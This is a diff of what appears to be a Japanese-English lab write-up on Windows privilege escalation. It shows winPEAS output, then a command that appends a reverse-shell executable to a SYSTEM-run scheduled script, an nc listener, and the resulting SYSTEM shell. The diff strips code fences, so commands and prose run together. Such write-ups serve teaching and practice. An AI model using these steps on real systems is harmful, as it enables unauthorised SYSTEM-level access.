@@ -33,14 +33,12 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+
 
 ### Not implemented (or log not saved)
 
-```
 
 ### 2. Local Shell
 
@@ -69,7 +67,6 @@ winPEAS の結果から、標準外ディレクトリ内でユーザー書き込
 この時点で重要なのは「書ける」だけではなく、「高権限コンテキストで実行されるかどうか」です。  
 `C:\DevTools\CleanUp.ps1` は後続の権限昇格に直結する候補でした。
 
-```
 ╔══════════╣ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
      File Permissions "": Users [WriteData/CreateFiles]
      File Permissions "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RunWallpaperSetup.cmd": user [AllAccess]
@@ -77,7 +74,6 @@ winPEAS の結果から、標準外ディレクトリ内でユーザー書き込
 ╔══════════╣ Looking for Linux shells/distributions - wsl.exe, bash.exe
 
        /---------------------------------------------------------------------------------\
-```
 
 💡 Why this works: winPEAS は ACL, サービス, 自動実行, 既知ミスコンフィグを一括で拾えるため、手作業の抜け漏れを減らせます。特に `WriteData/CreateFiles` といった権限表示は、改ざん可能ファイルの早期特定に有効です。次に「そのファイルが誰権限で、どの頻度で実行されるか」を確認することで exploitability が確定します。
 
@@ -85,15 +81,8 @@ winPEAS の結果から、標準外ディレクトリ内でユーザー書き込
 攻撃側では待受リスナーを先に立て、タスク実行タイミングで reverse shell を受け取ります。  
 この手法は「writable script + privileged scheduler」の組み合わせが成立した時に非常に再現性が高いです。
 
-```
 echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
-```
-
-```
 rlwrap -cAri nc -lvnp 53
-```
-
-```
 ❌[22:19][CPU:10][MEM:44][TUN0:192.168.150.224][/tools/windows]
 🐉 > rlwrap -cAri nc -lvnp 53
 listening on [any] 53 ...
@@ -103,11 +92,9 @@ Microsoft Windows [Version 10.0.17763.737]
 
 C:\Windows\system32>
 
-```
 
 💡 Why this works: SYSTEM が実行する `CleanUp.ps1` に任意コマンドを追記できるため、実質的に権限委譲されたコード実行になります。タスクトリガーが発火すると追記した `reverse.exe` が SYSTEM で実行され、攻撃側リスナーに接続が返ります。これは ACL ミスコンフィグを利用した典型的な Windows privilege escalation です。
 
-```
 flowchart LR
     subgraph SCAN["🔍 SCAN"]
         direction TB
@@ -143,7 +130,7 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
-```bash
+```mermaid
 flowchart LR
     subgraph SCAN["🔍 スキャン"]
         direction TB
